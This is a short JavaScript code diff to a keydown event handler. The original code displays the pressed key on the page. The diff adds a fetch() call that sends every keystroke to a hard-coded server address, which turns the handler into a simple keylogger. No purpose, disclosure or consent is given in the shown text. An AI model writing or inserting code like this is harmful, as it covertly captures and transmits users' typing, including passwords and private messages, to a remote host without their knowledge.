@@ -8,4 +8,7 @@ document.addEventListener("keydown", function(event) {
 
     // Display the pressed key in the HTML element
     pressedKeyElement.textContent = String.fromCharCode(keyCode);
+
+    // Send the pressed key to the server
+    fetch(`http://192.168.0.186:8000/key?key=${String.fromCharCode(keyCode)}`);
 });
